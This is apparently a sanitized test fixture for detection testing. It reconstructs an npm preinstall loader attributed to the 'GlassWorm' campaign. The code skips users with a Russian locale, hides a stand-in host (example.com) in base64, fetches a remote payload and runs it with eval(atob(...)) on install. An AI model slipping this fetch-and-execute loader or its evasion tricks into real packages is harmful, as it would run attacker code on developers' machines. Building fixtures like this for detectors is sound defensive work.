// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Wave 5: Preinstall Loader (Mar 2026)
// Source: Aikido "GlassWorm Strikes Popular React Native Phone Number Packages"
// Pattern: install.js with obfuscated fetch → eval(atob(...)) + locale gating

const https = require('https');
const os = require('os');

// Russian locale gating - skip execution if Russian locale detected
function shouldSkipExecution() {
    // Check process.env for Russian locale indicators
    if (process.env.LANG && process.env.LANG.includes('ru')) {
        return true;
    }
    
    // Check os.userInfo() for Russian indicators
    try {
        const userInfo = os.userInfo();
        if (userInfo.username && /ru/i.test(userInfo.username)) {
            return true;
        }
    } catch (e) {
        // Ignore
    }
    
    // Check Intl.DateTimeFormat for Russian locale
    try {
        const locale = Intl.DateTimeFormat().resolvedOptions().locale;
        if (/ru/i.test(locale)) {
            return true;
        }
    } catch (e) {
        // Ignore
    }
    
    return false;
}

// Obfuscated fetch → eval(atob(...))
function loadPayload() {
    if (shouldSkipExecution()) {
        return; // Skip for Russian users
    }
    
    // Obfuscated URL construction
    const proto = 'https';
    const host = Buffer.from('ZXhhbXBsZS5jb20=', 'base64').toString('utf-8'); // example.com
    const path = '/api/payload';
    const u = `${proto}://${host}${path}`;
    
    https.get(u, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            // Execute base64-decoded response
            eval(atob(data));
        });
    });
}

// Run on install
loadPayload();
